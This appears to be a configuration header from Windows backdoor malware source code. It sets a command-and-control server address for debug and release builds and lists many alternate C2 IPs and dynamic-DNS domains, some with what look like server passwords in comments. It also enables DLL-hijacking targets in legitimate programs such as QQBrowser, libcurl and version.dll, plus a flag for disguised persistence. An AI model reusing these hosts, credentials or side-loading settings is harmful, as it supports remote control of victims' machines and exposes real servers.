#pragma once

#ifndef CONFIG_H_H_H
#define CONFIG_H_H_H

#pragma  pack(1)

typedef struct
{
	char username[16];
	char ip[16];
	char unused[32];
}ATTACK_RUN_PARAM, *LPATTACK_RUN_PARAM;

#pragma pack()

//#define SERVER_IP_ADDRESS_BAKEDOMAINNAME	"www.liujinguangsdn.top"
//#define SERVER_IP_ADDRESS_DOMAINNAME	"www.liujinguangsdm.xyz"
//#define SERVER_IP_ADDRESS_DOMAINNAME	"www.eyw168.com"
//#define SERVER_IP_ADDRESS_DOMAINNAME	"googlesun.f3322.net"
//#define SERVER_IP_ADDRESS_DOMAINNAME	"zozotown888.hopto.org"
//#define SERVER_IP_ADDRESS_BAKEDOMAINNAME	"zozotown888.hopto.org"

//#define SERVER_IP_ADDRESS			"58.222.39.42"				//sdjysongge110119
//#define SERVER_IP_ADDRESS			"174.139.49.74"				//JY123jy123
#ifdef _DEBUG
//#define SERVER_IP_ADDRESS			"47.101.189.13"
//#define SERVER_IP_ADDRESS			"47.100.238.162"
#define SERVER_IP_ADDRESS			"192.168.1.3"
#else
//#define SERVER_IP_ADDRESS			"192.168.1.6"
#define SERVER_IP_ADDRESS			"47.116.51.29"		//182.110.69.39
//#define SERVER_IP_ADDRESS			"hk.googleadc.com"		//182.110.69.39
//#define SERVER_IP_ADDRESS			"47.100.238.162"
#endif
//#define SERVER_IP_ADDRESS			"192.168.10.183"	
//#define SERVER_IP_ADDRESS			"43.248.98.4"
//#define SERVER_IP_ADDRESS			"47.92.78.138"
//#define SERVER_IP_ADDRESS			"10.0.2.15"
//#define SERVER_IP_ADDRESS			"67.229.151.58"				//Sata19820521//Jnchengf&*
//#define SERVER_IP_ADDRESS			"1.32.216.22"				//"TE!18@^#_+zhen"		"fu57!@#...FUyb"	//GONG119**#@!an
//#define SERVER_IP_ADDRESS			"162.247.103.6"				//"VJE@gds424"
//#define SERVER_IP_ADDRESS			"110.34.166.17"				//Longray0313	
//#define SERVER_IP_ADDRESS			"58.64.158.246"				//dministrato Longray0913 port 63498
//#define SERVER_IP_ADDRESS			"192.200.207.30"			//Longray0313
//#define SERVER_IP_ADDRESS			"1.32.200.31"				//Sata19820521
//#define SERVER_IP_ADDRESS			"115.236.49.68"	
//#define SERVER_IP_ADDRESS			"120.27.15.149"
//#define SERVER_IP_ADDRESS			"47.91.251.130"		
//#define SERVER_IP_ADDRESS			"47.101.189.13"	
//#define SERVER_IP_ADDRESS			"192.168.100.106"	

#ifdef NDEBUG
#define REBOOT_TO_FAKE_OTHERS		//not need to move itself to destiny folder ,for debug 
#endif


#ifdef _WINDLL
#define DLLHIJACK_QQBROWSER
#define DLLHIJACK_LIBCURL
#define DLLHIJACK_VERSION
#define DLLHIJACK_SBIEDLL
#define DLLHIJACK_GETCURRENTROLLBACK
#define DLLHIJACK_GOOGLESERVICE
#define DLLHIJACK_QQMGRDIARY
#define DLLHIJACK_CLOVER
#define DLLHIJACK_MSOOBE
#define DLLHIJACK_REKEYWIZ
#define DLLHIJACK_91ASSISTUPDATE
#define DLLHIJACK_FIRSTLOAD
#elif defined HOOK_ORG_DLL
#else
#endif




int ConfigIPFileParam();

int IndependentNetWorkInit();

unsigned int getIpFromStr(char * strip);

int removeSpace(char * data);

#endif




